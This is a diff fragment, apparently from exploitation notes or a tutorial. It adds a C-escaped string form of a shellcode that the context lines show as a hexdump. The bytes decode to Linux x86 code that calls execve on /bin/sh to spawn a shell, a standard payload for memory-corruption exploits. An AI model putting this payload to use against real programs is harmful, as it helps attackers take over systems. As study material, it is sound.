@@ -2,3 +2,8 @@
 00000000: eb0c 5b31 c004 0b31 c931 d2cd 80c3 e8ef  ..[1...1.1......
 00000010: ffff ff2f 6269 6e2f 7368 00              .../bin/sh.
 ```
+
+```
+\xeb\x0c\x5b\x31\xc0\x04\x0b\x31\xc9\x31\xd2\xcd\x80\xc3\xe8\xef
+\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00
+```
